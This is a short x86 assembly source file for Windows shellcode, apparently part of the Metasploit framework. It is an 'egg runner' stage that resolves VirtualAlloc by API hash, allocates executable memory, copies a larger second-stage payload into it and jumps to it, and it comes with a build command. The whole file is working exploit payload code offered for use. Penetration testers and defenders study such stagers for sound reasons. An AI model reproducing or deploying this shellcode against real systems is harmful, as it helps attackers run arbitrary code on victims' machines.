;; Shellcode that can copy other shellcode to RWX memory and jump to it.
;; Similar to an egg hunter, just without the hunting. Useful to run larger
;; shellcode that we can write to RW memory, as we know the address of the
;; shellcode.

;; nasm -O3 -I path/to/msf3/ -o win32_egg-runner.payload win32_egg-runner.asm

[BITS 32]
[ORG 0]
  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "external/source/shellcode/windows/x86/src/block/block_api.asm"
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
  jmp collect_offset_pointer
offset_pointer_collected:
  pop esi
  push byte 0x40         ; VirtualAlloc(NULL, [esi], MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  push 0x3000
  push dword [esi]
  push 0
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp
  mov edi, eax
  mov ecx, [esi]
  mov esi, [esi+4]
  rep movsb
  jmp eax
collect_offset_pointer:
  call offset_pointer_collected
  ;; here comes the length and the address of our egg